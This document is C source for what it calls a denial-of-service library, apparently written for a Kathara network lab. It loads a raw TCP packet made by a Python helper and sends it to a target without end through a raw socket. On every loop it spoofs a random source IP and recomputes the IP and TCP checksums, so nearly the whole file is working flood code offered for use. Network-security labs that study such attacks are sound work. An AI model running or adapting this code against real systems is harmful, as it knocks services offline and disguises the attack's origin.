/**
 * @file flood_core.c
 * @author TheRedCowboy
 * @brief Main Library for the Raw packet and socket creation.This module provides
 * some functions for the creation of the raw tcp packet (via python script),then 
 * performs heap allocation to store the raw packet retrieved from the storage,Packet 
 * Manipulation and after that it perform a Denial of service attack sending the 
 * malformed packet
 * @version 1.0
 * @date 2026-03-02
 * 
 * @copyright Copyright (c) 2026
 * 
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <stdint.h>
#include <time.h>
#include "flood_core.h"


/**
 * -------------------------------------
 * Cross Platform Network Dependencies
 * -------------------------------------
 * @note Included for cross-platform coding conventions. 
 * Although the testing environment is strictly Linux-based (Kathara), 
 * these headers ensure source consistency, while the core logic 
 * targets POSIX-compliant raw sockets.
 */
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/ip.h>
    #include <netinet/tcp.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif


#define BASH_SIZE 512
#define DEFAULT_TCP_SEGMENT_SIZE 1 
#define DEFAULT_IP_ADDR_SIZE 16


/**
 * @struct pseudo_header
 * @brief Required for TCP checksum calculation
 * It encapsulates the IP header fields needed by the TCP protocol 
 * to verify segment integrity.
 */
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

/**
 @brief Invokes the Python engine for raw packet crafting.
 * Runs the external script 'packet_maker.py' to generate and 
 * serialize the raw TCP/IP frame into a binary file.
 * @return int Execution status (0 for success, -1 for failure). 
 */
int script_loader(){
   char *command = malloc(BASH_SIZE); // Allocate memory for the command string
   if (!command) return -1;
    
    snprintf(command, BASH_SIZE, "python3 ../packet_maker.py"); // Construct the command to execute the Python script
    int res = system(command);
    
    free(command);
    return res;
}

/**
 * @brief Loads the raw packet from the binary file, extracts destination IP and port,
 * and prepares the buffer for sending. It reads the packet structure, retrieves the
 * destination IP and port from the appropriate offsets, and reallocates the buffer to fit
 * the actual packet size. The function ensures that the packet is correctly loaded into memory
 * and ready for manipulation before sending it through the raw socket. It also handles potential
 * errors in file reading or memory allocation.
 * 
 * @param buffer Pointer to the buffer that will hold the raw packet data. It is allocated and resized within the function.
 * @param port Pointer to an integer where the destination port will be stored after extraction from the packet.
 * @param ip Character array where the destination IP address will be stored after extraction from the packet. It should be pre-allocated with sufficient size (at least 16 bytes for IPv4).
 * @return int Returns the size of the loaded packet on success, or -1 on failure (e.g., file not found, memory allocation failure). 
 */
int pkt_loader(char** buffer,int* port,char* ip){
    uint16_t pkt_raw_size;
    uint16_t tmp;
    FILE *FP = fopen("../generated/packet.bin","rb"); // Open the binary file containing the raw packet data

    int pkt_size;
    char raw_ihl;
    char* realloc_buffer;
    
    if(!FP){ // Check if the file was opened successfully
        perror("No such file or Directory");
        return -1;
    }
    
    fread(&raw_ihl,1,1,FP); // Read the first byte to get the IP header length (IHL)
    raw_ihl=raw_ihl & 0x0F; // Mask the IHL to get the actual header length in 32-bit words

    fseek(FP,(raw_ihl*4)+2,SEEK_SET); // Move the file pointer to the offset where the destination port is stored (after the IP header and 2 bytes for source port)
    fread(&tmp,2,1,FP); // Read the destination port (2 bytes) from the file

    *port=ntohs(tmp); // Converto into the Little Endian format and store it in the provided port variable

    fseek(FP,16,SEEK_SET); // Move the file pointer to the offset where the destination IP is stored (16 bytes from the start of the IP header)
    fread(ip,1,4,FP); // Read the 4 bytes of the destination IP address from the file and store it in the provided ip variable

    sprintf(ip, "%d.%d.%d.%d",(unsigned char)ip[0],(unsigned char)ip[1],(unsigned char)ip[2],(unsigned char)ip[3]); // Convert the raw IP bytes into a human-readable dotted-decimal format and store it back in the ip variable

    fseek(FP,2,SEEK_SET); // Move the file pointer to the offset where the packet size is stored (after the first 2 bytes of the IP header)
    fread(&pkt_raw_size,2,1,FP); // Read the raw packet size (2 bytes) from the file and store it in pkt_raw_size variable. This size includes the entire IP packet (header + payload).

    pkt_size = ntohs(pkt_raw_size);

    realloc_buffer = (char*) realloc(*buffer,pkt_size); // Reallocate the buffer to fit the actual packet size. This ensures that we have enough memory to hold the entire packet data.
    
    if(!realloc_buffer) { // Check if the memory reallocation was successful
        perror("\033[31m \n\t Error [0x401] : Out of Memory \033[0m\n");
        fclose(FP);
        return -1; 
    }
    
    *buffer=realloc_buffer; // Update the buffer pointer to point to the newly allocated memory that can hold the entire packet

    fseek(FP,0,SEEK_SET); // Move the file pointer back to the beginning of the file to read the entire packet data into the buffer
    fread(*buffer, 1, pkt_size, FP); // Read the entire packet data from the file into the buffer. The size of the data read is determined by pkt_size, which was extracted earlier from the file. This ensures that we have the complete raw packet loaded into memory for further manipulation and sending through the raw socket.

    fclose(FP);

    return pkt_size;
}

/**
 * @brief Calculates the checksum for the given buffer. 
 * This function is used to compute the checksum for both IP and TCP headers, 
 * ensuring data integrity during transmission. It processes the buffer in 16-bit words, 
 * summing them up and handling any odd byte if present. 
 * The final checksum is obtained by folding the sum and taking the one's complement.
 * 
 * @param ptr Pointer to the buffer for which the checksum is to be calculated. It should point to the start of the header (IP or TCP) for which the checksum is being computed.
 * @param nbytes The number of bytes in the buffer that should be included in the checksum calculation. This typically corresponds to the length of the header (e.g., IP header length or TCP segment length).
 * @return unsigned short Returns the computed checksum value, which can be used to set the checksum field in the IP or TCP header before sending the packet.
 */
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte, answer;

    while (nbytes > 1) { // Process the buffer in 16-bit words
        sum += *ptr++;
        nbytes -= 2;
    }


    if (nbytes == 1) { // If there is an odd byte left, process it
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr; // Copy the odd byte into the lower 8 bits of oddbyte
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff); // Fold the sum to fit into 16 bits by adding the carry (if any) back into the lower 16 bits
    sum = sum + (sum >> 16); // Add any remaining carry from the previous step to ensure the sum is fully folded into 16 bits
    answer = (short)~sum; // Take the one's complement of the sum to get the final checksum value
    return answer;
}

/**
 * @brief Create a socket object.
 * This function initializes a raw socket for sending crafted TCP packets. 
 * It sets up the socket with the appropriate parameters for raw communication 
 * and configures the destination address structure with the provided IP and port. 
 * The function also includes error handling to ensure that the socket is created successfully, 
 * and it provides feedback on the status of the socket creation process. 
 * If the socket is created successfully, it returns the socket file descriptor; otherwise, it returns 0 to indicate failure.
 * 
 * @param din Pointer to a sockaddr_in structure that will be populated with the destination address information (IP and port) for the raw socket communication.
 * @param dest_addr String containing the destination IP address in dotted-decimal format (e.g., "192.168.1.1").
 * @param dest_port Integer representing the destination port number to which the crafted packets will be sent. This value will be set in the sockaddr_in structure for the socket communication.
 * @return int Returns the file descriptor of the created socket on success, or 0 if there was an error during socket creation. The caller should check the return value to ensure that the socket was created successfully before proceeding with sending packets.
 */
int create_socket(struct sockaddr_in *din,char* dest_addr,int dest_port){
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); // Create a raw socket with the AF_INET address family, SOCK_RAW type, and IPPROTO_RAW protocol. This allows for sending custom-crafted IP packets directly at the network layer.

    if(sock < 0){ // Check if the socket was created successfully. If the socket function returns a negative value, it indicates an error in socket creation.
        perror("\n\n\t \033[31m [x] Socket Creation Failed (Run it with SUDO)\033[0m");
        return 0;
    }
 
    din->sin_family = AF_INET;
    din->sin_addr.s_addr = inet_addr(dest_addr);
    din->sin_port = htons(dest_port);

    printf("\n\n\t \033[32m [+] Socket Created, t -3 to execution\033[0m \n\n");
    sleep(3);

    return sock;
}

/**
 * @brief Executes the Denial of Service attack by sending malformed TCP packets in an infinite loop.
 * The function first loads the raw packet and extracts the destination IP and port. 
 * It then creates a raw socket and prepares the packet for sending.
 * In each iteration of the loop, it randomizes the source IP address, recalculates the IP and TCP checksums, and sends the packet to the target.
 * The function also keeps track of the number of requests sent and prints this information to the console.
 *  
 * @return _Bool Returns 1 on successful execution of the attack, or 0 if there was an error in loading the packet or creating the socket. 
 */
_Bool execute_denial() {
    int dest_port;
    char dest_addr[DEFAULT_IP_ADDR_SIZE];
    struct sockaddr_in din;
    char* buffer = (char*) malloc(DEFAULT_TCP_SEGMENT_SIZE); // Allocate initial memory for the buffer to hold the raw packet data. 
                                                             //This will be reallocated later to fit the actual packet size.
                                                             //This is done to ensure that we do not initialiaze the buffer with a size that is much more than the actual packet size,
                                                             // which could lead to inefficient memory usage.

    script_loader(); 
    int size = pkt_loader(&buffer, &dest_port, dest_addr); // Load the raw packet from the binary file, extract the destination IP and port, and prepare the buffer for sending. The size of the loaded packet is returned.
    if(size <= 0) {
        free(buffer);
        return 0;
    }

    int sock = create_socket(&din, dest_addr, dest_port); // Create a raw socket and configure the destination address structure with the provided IP and port. The function returns the socket file descriptor.
    if(sock <= 0) {
        free(buffer);
        return 0;
    }

    struct ip *iph = (struct ip *) buffer; // Cast the buffer to an IP header structure to access the IP header fields. This allows for manipulation of the IP header, such as randomizing the source IP address and recalculating the checksum before sending the packet.
    struct tcphdr *tcph = (struct tcphdr *) (buffer + (iph->ip_hl << 2)); // Calculate the pointer to the TCP header by adding the IP header length (in bytes) to the buffer pointer. The IP header length is determined by the ip_hl field of the IP header, which is in 32-bit words, so it is multiplied by 4 (shifted left by 2) to convert it to bytes. This allows for manipulation of the TCP header fields, such as recalculating the checksum before sending the packet.
    
    struct pseudo_header psh;
    psh.dest_address = iph->ip_dst.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(size - (iph->ip_hl << 2)); // Calculate the TCP segment length by subtracting the IP header length from the total packet size. The result is converted to network byte order using htons() and stored in the pseudo_header structure for later use in checksum calculation.

    int tcp_len = ntohs(psh.tcp_length);
    int psize = sizeof(struct pseudo_header) + tcp_len; // Calculate the size of the pseudo header plus the TCP segment length. This size is needed for the checksum calculation of the TCP header, as the TCP checksum covers both the TCP header and payload, as well as certain fields from the IP header (source and destination addresses, protocol, and TCP length) that are included in the pseudo header.
    char *pseudogram = malloc(psize);

    unsigned int requests_counter = 1;
    srand(time(NULL));

    while(1) {
        iph->ip_src.s_addr = (rand() % 255) | (rand() % 255 << 8) |     // Ip Spoofing phase : randomize the source IP address by generating random values for each octet and combining them into a single 32-bit value. This is done by generating a random number between 0 and 255 for each octet, shifting them to the correct position, and using bitwise OR to combine them into a single IP address. This technique allows the attacker to mask the true source of the attack traffic, making it more difficult for defenders to trace the attack back to its origin. 
                             (rand() % 255 << 16) | (rand() % 255 << 24);

        iph->ip_sum = 0; 
        iph->ip_sum = csum((unsigned short *)buffer, iph->ip_hl << 2); // Recalculate the IP header checksum after modifying the source IP address. The checksum is calculated by calling the csum function with the buffer pointer and the length of the IP header (in bytes) as arguments. This ensures that the IP header is correctly checksummed before sending the packet, which is necessary for the packet to be accepted by the target system.

        psh.source_address = iph->ip_src.s_addr; // Update the pseudo header with the new source IP address for TCP checksum calculation. This is necessary because the TCP checksum covers certain fields from the IP header, including the source and destination addresses, so the pseudo header must be updated to reflect any changes made to these fields before recalculating the TCP checksum.
        tcph->check = 0; // Reset the TCP checksum field to 0 before recalculating it. This is necessary because the checksum calculation will include the value of the checksum field itself, so it must be set to 0 to ensure that the correct checksum value is computed based on the current state of the TCP header and payload.
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header)); // Copy the pseudo header into the pseudogram buffer for TCP checksum calculation. The pseudo header is used in the TCP checksum calculation to include certain fields from the IP header (source and destination addresses, protocol, and TCP length) that are not part of the actual TCP segment but are necessary for ensuring data integrity during transmission. By copying the pseudo header into a separate buffer, we can easily calculate the TCP checksum based on both the TCP header and payload, as well as the relevant fields from the IP header.
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, tcp_len); // Copy the TCP header and payload into the pseudogram buffer immediately following the pseudo header. This allows for the TCP checksum calculation to cover both the TCP header and payload, as well as the relevant fields from the IP header that are included in the pseudo header. By combining these components into a single buffer (the pseudogram), we can easily compute the correct TCP checksum value that will be set in the TCP header before sending the packet to the target.
        tcph->check = csum((unsigned short*)pseudogram, psize); // Recalculate the TCP checksum using the pseudogram buffer, which includes the pseudo header and the TCP segment (header + payload). The csum function is called with the pseudogram pointer and its size as arguments to compute the correct TCP checksum value. This checksum is then set in the TCP header's check field to ensure that the packet is correctly checksummed before being sent to the target system.

        sendto(sock, buffer, size, 0, (struct sockaddr *)&din, sizeof(din)); // Send the crafted packet to the target using the raw socket. The sendto function is called with the socket file descriptor, the buffer containing the raw packet data, the size of the packet, flags set to 0, a pointer to the destination address structure (din), and the size of the destination address structure. This function will transmit the crafted packet to the target IP and port specified in the din structure.

        printf("\n\t %u Sending requests to %s:%d ", requests_counter++, dest_addr, dest_port);
        requests_counter++;
    }

    free(pseudogram);
    close(sock);
    free(buffer);
    return 1;
}


